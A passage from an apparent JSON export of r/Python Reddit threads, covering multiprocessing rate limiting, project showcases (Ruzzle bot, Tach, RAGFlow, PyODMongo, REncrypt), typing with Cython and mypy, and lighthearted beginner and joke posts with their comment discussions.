shared between processes through inheritance\nAnd to be fair the Googling didn't really help me figuring out how to get around it, just finding more people struggling with the issue:\nhttps://stackoverflow.com/questions/69907453/lock-objects-should-only-be-shared-between-processes-through-inheritance\nhttps://github.com/python/cpython/issues/79967#issuecomment-1455216546\nThe solution would be to not use the ProcessPoolExecutor but that was a bummer. This comment helped me to find the way I've ended up using:\nhttps://stackoverflow.com/a/65377770/3508719\nI'm glad that using the SyncManager and its proxies I managed to come up with a solution that allows me to use the executor.\nNote\nI use multiprocessing instead of multithreading as there is some post-processing done to the data returned from the REST API.\nI imagine that for better efficiency I could split the system into a single process that does a lot of multithreading for REST API interaction, and then pass the returned data to several processes for post-processing. I didn't have time to do it at the moment, but I'm aware of this as a potential alternative.\nI've built an earlier version of the rate limiter using multiprocessing Listener and Client - and carried out the communication through sockets/pipes. While this is useful to know about for inter-process communication, it turned out to be too slow and not support 100s of concurrent requests.\nIf one of the existing libraries (eg. one of the ones I've listed) supports cross-process rate limiting with ProcessPoolExecutor, I'd love to see how to do it, please share an example!\nMultiprocessing can be a pain 😭\nAny feedback on my implementation welcome!",
    "comments": [
        {
            "author": "qckpckt",
            "score": "8",
            "content": "It looks like you’ve engineered a solution to the problem you’ve made for yourself by coupling processing to data retrieval. Like you mentioned, this problem would likely just go away if you used multi threading or async for your IO bound work. For the CPU bound work, it’s really unlikely that python multiprocessing is the right answer either. You’d be better served using a library that pushes the computation down a more efficient low-level language. Depending on the data volume in question, pandas might be fine, or maybe something like duckdb if you want more efficient memory usage and are dealing with large sets of files on disk.",
            "replies": [
                {
                    "author": "spicypixel",
                    "score": "1",
                    "content": "Yeah or use a framework like ray for cpu bound function calls"
                },
                {
                    "author": "VoyZan",
                    "score": "0",
                    "content": "Thanks for the feedback! I considered both solutions and it felt easier to figure out rate limiting on multiple processes, than separate REST API multithreading and post-processing using multiprocessing. I felt that having to pass a large amount of data between that asyncio process and the post-processors would be a bottleneck. Also, I was imagining some added complexity if the asyncio process outperformed the post-processing speed and ended up clogging up the queue. Likely I'm missing something here though - is it really that much more straightforward? Would you be able to comment on what challenges could this pose? I'm imagining the implementation would involve something like a SyncManager.Queue that gets populated by the asyncio process, and consumed by the post-processors? Side tracking, I tried using Pandas for data writing, but am slowly moving away from it since its datatypes cause me a hell lot of headaches. I found two equal DataFrames with equal datatypes producing distinct checksums. I don't mind trading a bit of writing speed for better data consistency. The full dataset will be around 200-400gb I estimate.",
                    "replies": [
                        {
                            "author": "qckpckt",
                            "score": "2",
                            "content": "It sounds like you are retrieving data and then post processing it at the same time, without writing the data to disk in between. Why? What happens if there’s an error in the post processing step? Do you then have to start again? In my experience (I work as a data engineer), the best thing to do is keep things simple. Assuming this was intended to run on a single machine, here’s a general approach I would take. I would write code that retrieves data from the API, possibly using multi threading or asyncio, but only if it was necessary to do so in order to retrieve data efficiently. Even this has been quite a rare occurrence. Then, I’d write that data to disk, in a format as close to raw as possible. If the data is JSON, I’d store it in JSON (probably compressed with something like ZSTD for space efficiency). I would then write other code that reads the raw data from disk to do any post processing. Potentially I’d create multiple steps - the first might be to infer/enforce a schema on the raw data and save it in a more efficient format such as parquet, and potentially id also repartition the data at this point in a way that makes more sense. From then on, I might use a library like duckdb to perform further transformations and analysis. I’d then use some kind of scheduler to run all this at a cadence that makes sense. Each step would be designed to run in isolation. The raw api retrieval step would look at the data it has retrieved already to know what data it needs to fetch next. In the case of a multithreaded approach, I’d be looking to use any filtering or pagination options to create raw output files partitioned in some fashion, EG by date or datetime. Each thread would write one file. If something goes wrong, that thread fails (maybe it retries once or twice), but the rest of the program continues. The job would look for missing partitions each time it starts. The downstream jobs would do the same. Check source, check dest, process what can be processed. There may need to be additional logic so that for example it won’t process a day until all 24 hours of data for that day have partitions. If there is a need for data to be accessible in real time, then I’d probably first really question whether that is true. I’d then want to look very closely at where the data is stored, and what options I have to access it other than a REST API. Or perhaps, the data required in real can be retrieved in a transactional fashion from the rest API and processed efficiently enough to be done in real time (ie if no aggregations are needed). Even in that scenario, I’d probably write each step to disk so that it only needs to speak to the API once."
                        },
                        {
                            "author": "thisismyfavoritename",
                            "score": "1",
                            "content": "there is a cost when passing data between processes, it implies serializing and deserializing it plus sending it over a pipe. That is normally mitigated by making sure the work you are doing will be larger than that through batching the work to be done. When it comes to the asyncio process going too fast, the easiest way is to just poll data, submit to the pool while blocking, and then collect the results."
                        }
                    ]
                }
            ]
        },
        {
            "author": "turtle4499",
            "score": "2",
            "content": "First please for the love of god update those SO posts lol. Yea I had no idea that multiprocessing had a lock feature is that newish? Second I do think in your specific case you probably don't want to use a lock TBH. I think you would be better off using multithreading or async (async will be orders of magnitude faster) for your download threads. Then use multiprocessing to actually process the data. You can do some other stuff with shared memory if you want to speed that up further or if you find a library that allows u to stream your read pipe directly to the other processes. Multiprocessing in python tends does best IMO when you give each process descriptive roles and avoid them all being pure duplicates. It is generally easier to debug that way. Kinda like breaking up your program into fuctions its generally easier to break up your processes into smaller parts.",
            "replies": [
                {
                    "author": "VoyZan",
                    "score": "1",
                    "content": "Thanks for your feedback! Can you share some resource on how to pipe directly from one process to another? And, sorry, what do you mean about updating SO posts?"
                }
            ]
        },
        {
            "author": "divad1196",
            "score": "1",
            "content": "Too long.. I faced the same issue, solved it by using pyrate lib or ratelimit (depends on your needs). With Pyrate, you can have an external store for your processes. Takes a few lines, quite easy to implement",
            "replies": [
                {
                    "author": "VoyZan",
                    "score": "1",
                    "content": "Thanks for the suggestions! Sorry, which Pyrate? I found a bunch: https://github.com/dsilvestro/PyRate https://geoscienceaustralia.github.io/PyRate/ https://pypi.org/project/pyrate/ Could you expand on that external store for processes and how would that work? Dlso, does ratelimit support multiprocessing rate limiting?"
                }
            ]
        },
        {
            "author": "pan0ramic",
            "score": "1",
            "content": "It just happens that I spent all day trying to solve a very similar problem as you. Just in case it's helpful, I ended up going with aiometer which solved the problem quite simply. I just followed their sample at the top of their README and it worked! Rate limited API calls with asyncio and httpx."
        },
        {
            "author": "thisismyfavoritename",
            "score": "1",
            "content": "solution is to not use multiprocessing everywhere, just have the webserver on asyncio and if you have CPU bound work, use a queue to a process pool to push jobs and receive results in the other process running the async runtime. The time you spent fiddling with this couldve been spent in fixing your design, which is the actual problem, like you mention in your notes at the end"
        },
        {
            "author": "Barafu",
            "score": "1",
            "content": "Reimplementing standard library I see. (👉ﾟヮﾟ)👉 multiprocessing.Value 👈(ﾟヮﾟ👈) Each request job checks value of Value. If below 1000, it increments by one and does a request. If at or above 1000, the job sleeps a little and rechecks again. A separate thread in the main process resets value to zero once per minute. Alternatively, and maybe even better, save a timestamp in mseconds into Value. A job checks current time and Value. If the time since Value value is larger than a 1/1000 of a minute, it updates the Value with current time and makes request. No need for a timer thread this way, but use multiprocessing.Lock to make sure that comparing and updating Value is atomic. Value has its own instance of lock, no need to make another. Which way to choose depends on whether you prefer a burst of action at the beginning of a minute or have your requests spread equally through the minute."
        }
    ]
},
{
    "post_author": "baranonen",
    "post_id": "hvq628",
    "post_score": "2812",
    "post_time": "Wednesday, July 22, 2020 at 11:38:44 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Randomly Generate 69420 - Generate random 5-digit numbers until 69420 is generated",
    "media": [
        "https://external-preview.redd.it/OVoGqP9GdHb2WawcmHmrpEXeG8NogmWMXalriski430.png?width=640&crop=smart&format=pjpg&auto=webp&s=803f5eb0e5fe03a76b0cdec505d0beb8476d8329"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "theHighFastball",
            "score": "1018",
            "content": "Forty thousand years of evolution and we've barely even tapped the vastness of human potential.",
            "replies": [
                {
                    "author": "acharyarupak391",
                    "score": "74",
                    "content": "this sounds like sth i'd hear in a sci-fi documentary",
                    "replies": [
                        {
                            "author": "CptSupermrkt",
                            "score": "53",
                            "content": "It's a Norman Osbourne quote from Spiderman lol"
                        }
                    ]
                },
                {
                    "author": "zdog234",
                    "score": "11",
                    "content": "This sounds like something Jeff goldblum's character would say",
                    "replies": [
                        {
                            "author": "WadeEffingWilson",
                            "score": "26",
                            "content": "\"Python, uh, finds a way.\""
                        }
                    ]
                },
                {
                    "author": "prohtos",
                    "score": "4",
                    "content": "That's the best thing I've read this month. Take my upvote you beautiful bastard.",
                    "replies": [
                        {
                            "author": "ws24130",
                            "score": "1",
                            "content": "Mine too fuck it"
                        }
                    ]
                },
                {
                    "author": "_szs",
                    "score": "4",
                    "content": "40000 years of evolution? Actually 40000 years ago, the modern human appeared after a million years of evolution (or more, depending where you start to count). 150 years of evolution theory and people still don't get it m( Edit: Wow. Downvotes mm(",
                    "replies": [
                        {
                            "author": "theHighFastball",
                            "score": "0",
                            "content": "Lmao"
                        }
                    ]
                }
            ]
        },
        {
            "author": "anynonus",
            "score": "272",
            "content": "thanks! this is going straight to production branch"
        },
        {
            "author": "Gwenju31",
            "score": "250",
            "content": "Now continue trying until you generate 69420 in 69420 tries",
            "replies": [
                {
                    "author": "Rodot",
                    "score": "143",
                    "content": "That would take about 200,000 trials on average https://en.m.wikipedia.org/wiki/Geometric_distribution p=1/90,000 k=69420"
                }
            ]
        },
        {
            "author": "Chevaboogaloo",
            "score": "180",
            "content": "Hello, yes I have optimized your code. See below: print('69420')"
        }
    ]
},
{
    "post_author": "lambda5x5",
    "post_id": "ejnnbc",
    "post_score": "2490",
    "post_time": "Saturday, January 4, 2020 at 2:21:34 AM GMT+3",
    "flair_text": "",
    "post_title": "I wrote a python script that I'm running on my phone to play a word game called Ruzzle.",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "lambda5x5",
            "score": "294",
            "content": "In Ruzzle, the goal of the game is to get as many points as possible in a timed period. Letters have point values, and modifiers like double letter and triple word change point values of certain words. Everything is done automatically at a button press with Tasker, and automation app for android. I use it to take a screenshot, and then I start a python script running in Termux (linux environment/terminal emulator). This python script crops each letter and gets the value with pytesseract, an OCR library. Next, I run a simple DFS through the grid from each letter to grab all the words, stopping if a prefix doesn't exist (ex a word starting with HTH). I also grab colors of the top left corners to get the multipliers, and then I calculate word scores for all words in a dictionary. Finally, I sort the words by score and grab the coordinates for each of the letters, and store these in a file. I then use some adb sendevent shell commands to simulate fingerpresses, and then I win every game! I faced many problems throughout the development of this project, and I learned a ton and used a lot of new modules. Speeding up parts of the code was annoying and it certainly can still be sped up, but I was able to get the runtime from 30s down to around 2-3s. If you have any questions please ask!"
        },
        {
            "author": "port443",
            "score": "135",
            "content": ""
        },
        {
            "author": "DrTautology",
            "score": "42",
            "content": "I used to play word hero a lot and I'm pretty certain this how people were getting the high scores."
        },
        {
            "author": "MrChaos84",
            "score": "37",
            "content": "How you run your script and how you manipulate inputs?"
        },
        {
            "author": "----Jay----",
            "score": "34",
            "content": "Holy shit, awesome work! Keep it up!"
        },
        {
            "author": "Killerseaguls",
            "score": "6",
            "content": "Highest word point to least lol. Niceeeee"
        },
        {
            "author": "f1_manu",
            "score": "16",
            "content": "Nice job, you got a github?"
        },
        {
            "author": "volta_seca",
            "score": "6",
            "content": "super cool! I was thinking about doing something similar with a game I enjoy playing, but I didn't have any idea of how to begin. you gave me a nice insight!"
        },
        {
            "author": "imonlyhereforcrypto",
            "score": "2",
            "content": "First off, wow. Second, how do you get this to run on your phone? And thirdly, do you plan on posting the code for this because I am very intrigued."
        }
    ]
},
{
    "post_author": "radumarias",
    "post_id": "1d5jt6n",
    "post_score": "0",
    "post_time": "Saturday, June 1, 2024 at 1:12:58 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "A blend of Rust and Python: speeding up Python encryption",
    "media": [
        "https://github.com/radumarias/rencrypt-python"
    ],
    "post_content": "REncrypt\nWhat My Project Does A Python encryption library implemented in Rust. It supports AEAD with AES-GCM and ChaCha20Poly1305. It uses ring to handle encryption. If offers slightly higher speed compared to other Python libs, especially for small chunks of data. The API also tries to be easy to use but it's more optimized for speed than usability. So if you are open to experiment and want to achieve the highest possible encryption speed, consider giving it a try.\nTarget Audience This is just a toy project as a learning experience\nComparison This is slightly faster than PyFLocker which from my benchmarks is the faster among other Python libs like cryptography, NaCl (libsodium), PyCryptodome",
    "comments": []
},
{
    "post_author": "AutoModerator",
    "post_id": "1d94r90",
    "post_score": "5",
    "post_time": "Thursday, June 6, 2024 at 3:00:09 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Thursday Daily Thread: Python Careers, Courses, and Furthering Education!",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "GLLShipley",
            "score": "1",
            "content": "I’ll be starting a python class next semester in the fall and was wondering the best side projects to boost my retention of the stuff I’ll be learning?(intro to programming class btw)",
            "replies": [
                {
                    "author": "akshatha_Sadananda",
                    "score": "2",
                    "content": "Use pygame library to build a small game. Doesn't have to be huge but make sure you get basic concepts Learn ruff Use pyqt to build a small gui app Try fastapi to build a service. Do some basic ML AND computer vision stuff"
                }
            ]
        }
    ]
},
{
    "post_author": "neozhaoliang",
    "post_id": "1d4ou3k",
    "post_score": "38",
    "post_time": "Friday, May 31, 2024 at 9:11:48 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "RAGFlow: Deep document understanding RAG engine",
    "media": [
        "https://github.com/infiniflow/ragflow"
    ],
    "post_content": "What My Project Does\nAn open-source RAG (Retrieval-Augmented Generation) engine based on deep document understanding. It offers layout recognition, OCR-based chunking templates for data cleasing and provides hallucination-free answers with traceable citations. Compatible with mainstream LLMs.\nTarget Audience\nRAG applications developers.\nComparison\nIt offers various chunking templates for various fils categories, such as resume, legal documents, table, and print copies.\nEnables human intervention in chunking, making the data cleansing process no longer a black box.\nIt not only presents answers but also offers quick views of references and links to the citations when answering to queries.\nLink: https://github.com/infiniflow/ragflow",
    "comments": [
        {
            "author": "babygrenade",
            "score": "3",
            "content": "I've found that a lot of document repositories have metadata tags that are useful to preserve and use with search. Does your engine have any place to preserve/track that kind of metadata?",
            "replies": [
                {
                    "author": "neozhaoliang",
                    "score": "1",
                    "content": "Hey u/babygrenade, because RAGFlow is not yet integrated with other document management systems, there is no such place for tracking the metadata. When it is integrated with such a document management, preserving metadata will be required."
                }
            ]
        },
        {
            "author": "Rudd-X",
            "score": "2",
            "content": "Cool."
        }
    ]
},
{
    "post_author": "britishbanana",
    "post_id": "1d7lgh7",
    "post_score": "20",
    "post_time": "Tuesday, June 4, 2024 at 4:38:56 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Using python for static typing benefits",
    "media": [],
    "post_content": "I'm interested in using cython specifically for introducing static typing to parts of a code base. For anyone who has used cython, could you give any details about your experience with introducing it gradually, how it changed the deployment and execution processes, how well it played with code that is calling lots of 3rd party frameworks. Also curious to hear about any headaches or issues it introduced.\nI'm less interested in the performance benefits, more interested in static type checks. I do use mypy already but I'm left quite lacking with it compared to real compilation checks. I'm curious more generally about the possibility of having a code base that mixes static and dynamic typing, and if I could stay in Python while doing that instead of going to Rust that would really simplify things.\nThanks!",
    "comments": [
        {
            "author": "Drevicar",
            "score": "49",
            "content": "As someone who regularly uses lower-level languages with strong type systems, Mypy in strict mode is actually a great experience. Between that and a super strict ruff config, you can force extreme code quality through the entire project without sacrificing being able to use Python and its rich ecosystem. So long as the data entering at the boundaries is properly enforced with something like Pydantic it is possible to model a system completely free of type-related problems.",
            "replies": [
                {
                    "author": "tankerdudeucsc",
                    "score": "5",
                    "content": "Enforced via a very clean OpenAPI spec is what I do. I’ve not used ruff but every package it replaces is what I use. So I’ll have to give that a go. Only package it doesn’t have us use of safety as part of the regular build scanners."
                },
                {
                    "author": "did_i_do_good",
                    "score": "2",
                    "content": "Do you have a strict ruff config you typically use that you could share?",
                    "replies": [
                        {
                            "author": "adesme",
                            "score": "1",
                            "content": "You can just do select “ALL” and ignore one of the ones which are incompatible and any you don’t care about",
                            "replies": [
                                {
                                    "author": "Drevicar",
                                    "score": "1",
                                    "content": "Sorry, I meant to reply with basically this. Normally you don't want to select ALL, because as ruff updates you get new rules, and you don't want your build to break because of a change that wasn't intentional on your part. To solve this I pin the version of ruff the same way I do all my dependencies, then I select \"ALL\" rules. Normally I ignore D100 through D107 because I hate mandatory docstrings. You also need to selectively ignore S101 if you are using pytest. The rest is to taste."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "thallazar",
            "score": "27",
            "content": "As someone that's used a small amount of cython professionally in an established python project, I'd sooner reach to rust with pyo3 personally. The build chains and integrations around cython were just a PITA.",
            "replies": [
                {
                    "author": "Simultaneity_",
                    "score": "5",
                    "content": "And you can say, \"I rebuilt it in rust\""
                },
                {
                    "author": "britishbanana",
                    "score": "2",
                    "content": "Yeah this is exactly what I was wondering, how big of a pain builds and integrations were going to be. Thanks for the feedback, I'll avoid that rabbit hole and look more to mypyc and rust where it makes sense."
                }
            ]
        },
        {
            "author": "james_pic",
            "score": "13",
            "content": "I've used Cython for performance reasons and it's great for that. You can port the code in your hottest loops and leave the rest of the code untouched, and it's close enough to Python that it's usable on a team where not everyone knows C. It is absolutely not a good way to introduce static typing to your system though. Its type system is more-or-less intended to reflect the types used by the Python C API, which means no generics, no protocols/duck typing, etc. It's definitely not the Rust-like language you think you want. It is absolutely inferior to Mypy for this. Mypy has been built to be able to reflect as many of the common idioms in Python as possible, with a view to incrementally adding types to old codebases. This makes its type system ugly, but a bolt-on type system to an existing language can't avoid this. Also, slightly more generally, it sounds like you want to write Rust in Python. Don't. Write Python in Python and write Rust in Rust. Python is designed to be Python, and it is bad at being anything else, at least partly by design.",
            "replies": [
                {
                    "author": "Maleficent-Region-45",
                    "score": "5",
                    "content": "• ⁠it sounds like you want to write Rust in Python. Don't. Write Python in Python and write Rust in Rust. Python is designed to be Python, and it is bad at being anything else, at least partly by design. Beautifully said. Python is so fast (to code) because it allows basically everything. Rust is so stable because of its strictness. Every tool has its place."
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "8",
            "content": "If you're primarily interested in static typing, but also want compilation - have you looked at mypyc?"
        }
    ]
},
{
    "post_author": "sentient-primate",
    "post_id": "ghab3o",
    "post_score": "2779",
    "post_time": "Monday, May 11, 2020 at 12:45:26 AM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Fourier Series Visualizer in pygame.",
    "media": [
        "https://external-preview.redd.it/xYSKdM7zSD9BU-6jygYUX_CGjSc91IQu0eIk31lJcms.png?width=640&crop=smart&format=pjpg&auto=webp&s=78c1b51a228622fbf51ed4133adf92568d56861d"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "sentient-primate",
            "score": "170",
            "content": "I know pygame isn't a great choice to visualize maths but I'm yet to learn animation using other libraries such as matplotlib. The 3b1b and Destin's videos on Fourier Visualizations were the fuel."
        },
        {
            "author": "ltcolroger",
            "score": "97",
            "content": "I love these kinds of visualizations! For control systems engineers, I would use such a video to demonstrate why signals with sharp edges have such high frequency content. You can see that a sharp edge takes a lot of different frequencies (terms) to represent, and so they can make useful test signals for exciting the dynamics of a system across a broad range of frequencies all at once.",
            "replies": [
                {
                    "author": "EnemyAsmodeus",
                    "score": "18",
                    "content": "Can someone explain this stuff? (my explanation: what I understand is that it's the math formulas for graphs of signals that are often seen in electricity, magnetics, waves). I took a course on Fourier Transforms. Still have no idea wtf it does because professors can barely speak English let alone articulate a complicated concept. How did anyone pass the class? Not sure, everyone got curved but not by that much because of one guy who read the textbook and just was great at the stuff. I basically remember memorizing formulas that's about it.",
                    "replies": [
                        {
                            "author": "DatBoi_BP",
                            "score": "36",
                            "content": "In addition to what the other guy said, I’d like to suggest the following resources, in order of increasing time commitment; note that these are for the Fourier Transform in general, not just Fourier Series, though there’s fundamentally no difference: This interactive webpage that's very well-coded and easy to use. You can probably run through the whole page in 15 minutes or less, depending on how much you choose to interact. Mary Boas' Mathematical Methods for the Physical Sciences. A world-class resource in math \"crash courses\" if you will, this book will be a lifelong resource for learning and relearning heavy math topics that you will use for the rest of your academic life. There's a lengthy section on Fourier Series and one on Fourier Transforms. This lecture series from Stanford. It's all about the Fourier Transform, and it's a very inviting course that will leave you entirely without questions or confusion by the end. By far the best resource on this list, but it would easily take you weeks to get through the 30 lectures, each I think 50 minutes long. Also, I believe this is the set of lecture notes and practice problems that goes along with this lecture series. It would be well worth your time to work with these materials once you've gained a decent front-end understanding from the first two sources I listed. Best of luck :)"
                        },
                        {
                            "author": "RIPphonebattery",
                            "score": "9",
                            "content": "I will simplify for you--i don't know what your level of comfort is. A former transform takes a function that is periodic (repeats on a given frequency) and spits out the harmonic frequencies of sine waves required to reconstruct that signal. Harmonic means it is an integer multiple of the base repeating frequency (N, 2N, 3N, etc.). Of course you can point a Fourier transform at any function in a specific range and it will spit out an exact recreation of that function, in that range, but also repeated forever. Fourier transforms are, fundamentally, a list. They list the frequency content of a signal. This is fundamental to electronic digital communication. How might your phone send the signal of your voice to your mother yesterday? It takes a short chunk of voice, does a Fourier transform, and then sends the list (much, much less data, limited by how many bits you are willing to send, or your bit rate). On the receiving end, a phone receives a list of bits, says, OK and then produces a signal from that list. The signal is a reconstruction of the original. Your mother hears your voice, but maybe a little tinny or not quite exactly the same. It's playing out of some small speakers a d your phone mic isn't perfect anyways. Plus I'm banging her anyways"
                        },
                        {
                            "author": "WiggleBooks",
                            "score": "7",
                            "content": "Yes! There's actually some really great Youtubers who explain all of this extremely well, on a intuitive level but also explaining the mathematics. Brian Douglas for Control Systems, Fourier Transforms. Steve Brunton for Data Science, Control Systems, System Dynamics and the combination of all of them. I'm not doing them justice. Just check them out on YouTube."
                        }
                    ]
                },
                {
                    "author": "draeath",
                    "score": "1",
                    "content": "This is also why clicks are used for recording impulse responses for convolution (in audio engineering or music production contexts). Let's you \"record\" the reverb of a particular space for use virtually."
                }
            ]
        },
        {
            "author": "rajandatta",
            "score": "25",
            "content": "Bloody brilliant. Had not thought of it this way."
        },
        {
            "author": "Acsutt0n",
            "score": "24",
            "content": "Great job and thanks for sharing code!"
        },
        {
            "author": "luizvacilus",
            "score": "6",
            "content": "This is awesome"
        },
        {
            "author": "CinnamonUranium",
            "score": "6",
            "content": "This is pretty cool. r/math might like this. Thanks for sharing."
        },
        {
            "author": "stevescola",
            "score": "5",
            "content": "Love it"
        },
        {
            "author": "tralfamadelorean31",
            "score": "2",
            "content": "I dunno if it's the right place to ask. But is signal modulation a form of Fourier transformation?"
        },
        {
            "author": "dangitbobby83",
            "score": "2",
            "content": "This is oddly satisfying to watch..."
        },
        {
            "author": "payloc",
            "score": "2",
            "content": "I love how, every 90 degrees, he slaps the shit out of those circles"
        }
    ]
},
{
    "post_author": "the1024",
    "post_id": "1d8sgbp",
    "post_score": "24",
    "post_time": "Wednesday, June 5, 2024 at 6:16:25 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Tach - enforce module boundaries + deps, now in Rust 🦀",
    "media": [
        "https://github.com/gauge-sh/tach/discussions/72",
        "https://github.com/gauge-sh/tach"
    ],
    "post_content": "https://github.com/gauge-sh/tach\nHey everyone! Wanted to share some pretty significant updates to the tool I've been working on. Tach lets you define module boundaries and enforce rules across your modules, including isolation, dependencies, and strict interfaces. Some updates -\nRe-wrote the core in Rust, leading to a ~19x speed up on large repos\nRe-worked the interface, and added a TUI to let you interactively declare modules\nWe built Tach to solve the “ball of mud” problem that we’ve ran into throughout all of my previous work experiences. Over time, the codebase would become tightly coupled together, making even simple changes/refactors painful. By setting up module boundaries and enforcing them early on, you can avoid all of this!\nTach is the best way to grow a modular monolith without creating a ball of mud. If anyone has any questions or feedback, I’d love chat!\nhttps://github.com/gauge-sh/tach\nWhat My Project Does\nTach enables you to interactively declare module boundaries, dependencies between modules, and strict interfaces for those modules. You can then enforce those declarations through a static code check.\nTarget Audience \nTeams maintaining python monorepos.\nComparison \nImport linter is probably the most similar tool - for a github discussion on the differences, check out this link - https://github.com/gauge-sh/tach/discussions/72",
    "comments": [
        {
            "author": "ManyInterests",
            "score": "5",
            "content": "This is great. I wonder, if you do imports guarded by something like if TYPE_CHECKING: should/does that still raise an issue? I usually try to have this kind of separation in my projects, but often find that I need to do imports just for typing purposes, but I personally don't consider it a dependency rule violation.",
            "replies": [
                {
                    "author": "the1024",
                    "score": "3",
                    "content": "u/ManyInterests great question! Someone actually raised that as an issue, and we added support for ignoring it! https://github.com/gauge-sh/tach/issues/56 https://gauge-sh.github.io/tach/configuration/#tachyml (see `ignore_type_checking_imports`)"
                }
            ]
        },
        {
            "author": "ralphcone",
            "score": "2",
            "content": "Nice, I've been looking for a tool like that for a while now. Will give it a try when I get home.",
            "replies": [
                {
                    "author": "the1024",
                    "score": "1",
                    "content": "Awesome, thank you u/ralphcone! If you're interested, happy to jump on a call and help you set it up/answer any questions you might have :)"
                }
            ]
        },
        {
            "author": "ageofwant",
            "score": "-1",
            "content": "Its propably better to just refactor monorepos into multiple git repos than is well understood and fits cleanly into established tooling and workflows. If your common libraries and services each has its own seperately versioned codebase you get loose copuling almost for free, with all the benefits of well scoped projects. I could never realy understand why people use monorepos, and then get upset when you don't use modules or functions or classes or any of the other things that we also use to fold complexity away. It is the same thing. Use the tools you have to soleve the probles you got, its really not that hard.",
            "replies": [
                {
                    "author": "the1024",
                    "score": "3",
                    "content": "u/ageofwant this can work depending on your setup, but you often are then introducing microservice management and orchestration. This takes complexity off of the individual team, but pushes it onto the deployment stack, causing a whole new set of issues. You now need to freeze apis between services, manage version support between services, introduce network overhead, etc. With this tool, you can get a lot of those benefits without any of those downsides. Long term, I want to add support for some of the operations that tooling doesn't quite match up to well yet, like task/build/test pipelines based on individual modules!"
                }
            ]
        }
    ]
},
{
    "post_author": "CROW_98",
    "post_id": "hl2ho5",
    "post_score": "2480",
    "post_time": "Saturday, July 4, 2020 at 3:24:22 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "Started learning python today, Screw 'Hello World' , I'll start with 'Hello There'",
    "media": [
        "https://preview.redd.it/wxx1gcbs2u851.png?auto=webp&s=48c81f2613e0918ca0ded9692a5c8f1b0eb2460b",
        "https://i.redd.it/wxx1gcbs2u851.png"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "porndragon77",
            "score": "487",
            "content": "You've broken the cardinal rule of programming young padawan",
            "replies": [
                {
                    "author": "CROW_98",
                    "score": "141",
                    "content": "Forgive me master.",
                    "replies": [
                        {
                            "author": "xXOSUTUMPETXx",
                            "score": "80",
                            "content": "How could you! Turned to the Darkside already"
                        },
                        {
                            "author": "jacrispy704",
                            "score": "4",
                            "content": "May I ask what the hell your profile pic is a reference to? I’ve seen it as just a spinning cockroach on here, too. Thanks!"
                        },
                        {
                            "author": "Chicken_Pirate",
                            "score": "1",
                            "content": "You're what's wrong with this generation. Just complete disgrace SMH /s"
                        },
                        {
                            "author": "[deleted]",
                            "score": "1",
                            "content": "Can’t say this it’s racist"
                        }
                    ]
                },
                {
                    "author": "LostInTheAether304",
                    "score": "8",
                    "content": "I break that cardinal rule often. Anytime I pick up a new language. I start with something like",
                    "replies": [
                        {
                            "author": "porndragon77",
                            "score": "4",
                            "content": ""
                        },
                        {
                            "author": "neeeesan",
                            "score": "2",
                            "content": ""
                        }
                    ]
                },
                {
                    "author": "DoctorEarwig",
                    "score": "3",
                    "content": ""
                },
                {
                    "author": "[deleted]",
                    "score": "2",
                    "content": ""
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "29",
            "content": ""
        },
        {
            "author": "fiftybengt",
            "score": "93",
            "content": "That's quality code"
        },
        {
            "author": "Awesomered989",
            "score": "60",
            "content": "print(\"You are a bold one.\")"
        },
        {
            "author": "IndyDrew85",
            "score": "55",
            "content": "You can use \\n in between hello world and general to create a new line without needing a second print"
        },
        {
            "author": "jimmone1",
            "score": "17",
            "content": "good luck"
        },
        {
            "author": "Im__Joseph",
            "score": "1",
            "content": "There are a lot of reports for this post. Seems the majority of people are enjoying it and having a chuckle and we have 2k upvotes now so I don't think there is any point acting. It is true, however, that this isn't exactly the goal we have for r/Python but I don't think this has harmed anyone, in future we'll act earlier but by the time I got here it was already a little too far :)"
        },
        {
            "author": "Manny__C",
            "score": "114",
            "content": "It's great that you started learning Python! I suggest undertaking small projects and following videos on YT to learn. I hope you'll have fun. Unfortunately your post is not appropriate for this subreddit since we are trying to push it to a more advanced/professional direction. r/learnpython is more suited for beginners"
        },
        {
            "author": "fuckermaster3000",
            "score": "12",
            "content": "Lets do a petition to change all beginner tutorials from \"Hello world\" to \"Hello there\""
        }
    ]
},
{
    "post_author": "maurinhoandre",
    "post_id": "1d7mhrr",
    "post_score": "8",
    "post_time": "Tuesday, June 4, 2024 at 5:31:39 AM GMT+3",
    "flair_text": "Showcase",
    "post_title": "PyODMongo an ODM for MongoDB",
    "media": [
        "https://pypi.org/project/pyodmongo/",
        "https://github.com/mauro-andre/pyodmongo"
    ],
    "post_content": "What My Project Does: PyODMongo is a modern Python library that serves as a robust Object-Document Mapper (ODM) and seamlessly bridges the gap between Python and MongoDB. It offers an intuitive and efficient way to interact with documents.\nBuilt on top of Pydantic V2, PyODMongo ensures that documents in the database rigorously represent the structure of Python objects. This means that documents are saved and retrieved from the database exactly as a Python object is structured, regardless of how nested the objects are and whether they are stored persistently or by reference. PyODMongo can automatically populate these documents.\nTarget Audience: Backend developers who want a simple and efficient way to work with MongoDB\nComparison: ODMantic ODM\nGitHub repository PyPi",
    "comments": [
        {
            "author": "WickedWicky",
            "score": "3",
            "content": "Awesome! I love the combination of Pydantic and Mongo, it's something I also use a lot but not with a dedicated package for it. I wonder though, why has the Field been redefined here: https://github.com/mauro-andre/pyodmongo/blob/master/pyodmongo/models/fields.py ? This is mostly the Field object from Pydantic, but I don't see where it differs. Also, I enjoy learning packages like this by going through the source code and building documentation for it. Would you be open to a PR that adds a readthedocs-type documentation page, with Sphinx and Github Pages?",
            "replies": [
                {
                    "author": "WickedWicky",
                    "score": "3",
                    "content": "Oh, I just found you already have documentation https://pyodmongo.dev/ which already looks great! Nice job"
                },
